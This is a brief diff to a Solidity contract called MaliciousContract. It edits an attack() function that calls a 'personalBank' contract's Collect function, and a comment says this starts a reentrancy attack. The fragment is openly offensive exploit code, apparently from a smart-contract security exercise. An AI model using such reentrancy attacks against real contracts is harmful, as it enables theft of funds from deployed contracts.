@@ -13,10 +13,11 @@ contract MaliciousContract {
 
     function attack() public payable {
         require(!attackInitiated, "Attack already initiated");
+        require(msg.value >= 1 ether, "Must send at least 1 ether");
 
         // Call the vulnerable function to start the reentrancy attack
         
-        personalBank.Collect.value(msg.value)(1 ether);
+        personalBank.Collect(msg.value);
 
         attackInitiated = true;
     }
